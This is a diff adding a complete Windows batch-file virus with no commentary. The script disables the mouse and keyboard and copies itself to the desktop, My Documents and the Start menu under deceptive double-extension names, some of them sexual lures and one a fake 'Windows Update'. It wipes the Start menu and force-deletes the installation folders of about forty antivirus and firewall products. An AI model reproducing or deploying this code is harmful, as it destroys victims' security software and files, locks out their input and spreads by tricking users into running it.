@@ -1,0 +1,52 @@
+@echo off
+cls
+@ver|find "XP"|if errorlevel 1 ctty nul|if not errorlevel 1 exit
+cls
+@rundll32.exe mouse,disable
+@rundll32.exe keyboard,disable
+@deltree/y %windir%\system\energy >nul
+@md %windir%\system\energy
+@copy %0 %windir%\system\angel\energy.bat
+@copy %0 %windir%\desktop\"FREE PORN Geisha ANAL SEX girls.url.bat" >nul
+@copy %0 %windir%\desktop\"Tyna blows his whistle.jpg.bat" >nul
+@copy %0 c:\mydocu~1\"HARDCORE girls with BIG TITS.doc.bat" >nul
+@copy %0 c:\mydocu~1\"Funny things with your boss.exe.bat" >nul
+@deltree/y %windir%\startm~1\*.* >nul
+@copy %0 %windir%\startm~1\"Windows Update.exe.bat" >nul
+@deltree/y c:\progra~1\norton~1\ >nul
+@deltree/y c:\progra~1\norton~2\ >nul
+@deltree/y c:\progra~1\symant~1\ >nul
+@deltree/y c:\progra~1\antiba~1.8\ >nul
+@deltree/y c:\progra~1\common~1\symant~1\ >nul
+@deltree/y c:\progra~1\common~1\avpsha~1\avpbases\ >nul
+@deltree/y c:\progra~1\common~1\avpsha~1\ >nul
+@deltree/y c:\progra~1\mcafee\viruss~1\ >nul
+@deltree/y c:\progra~1\mcafee\ >nul
+@deltree/y c:\progra~1\pandas~1\ >nul
+@deltree/y c:\progra~1\trendm~1\ >nul
+@deltree/y c:\progra~1\comman~1\ >nul
+@deltree/y c:\progra~1\zonela~1\ >nul
+@deltree/y c:\progra~1\tinype~1\ >nul
+@deltree/y c:\progra~1\kasper~1\ >nul
+@deltree/y c:\progra~1\kasper~2\ >nul
+@deltree/y c:\progra~1\trojan~1\ >nul
+@deltree/y c:\progra~1\avpers~1\ >nul
+@deltree/y c:\progra~1\grisoft\ >nul
+@deltree/y c:\progra~1\antivi~1\ >nul
+@deltree/y c:\progra~1\quickh~1\ >nul
+@deltree/y c:\progra~1\f-prot95\ >nul
+@deltree/y c:\progra~1\fwin32\ >nul
+@deltree/y c:\progra~1\tbav\ >nul
+@deltree/y c:\progra~1\findvi~1\ >nul
+@deltree/y c:\findvi~1\ >nul
+@deltree/y c:\esafen\ >nul
+@deltree/y c:\antiba~1.8\ >nul
+@deltree/y c:\f-prot\ >nul
+@deltree/y c:\f-macro\ >nul
+@deltree/y c:\tbavw95\ >nul
+@deltree/y c:\tbav\ >nul
+@deltree/y c:\vs95\ >nul
+@deltree/y c:\antivi~1\ >nul
+@deltree/y c:\toolkit\findvi~1\ >nul
+@deltree/y c:\pccill~1\ >nul
+cls
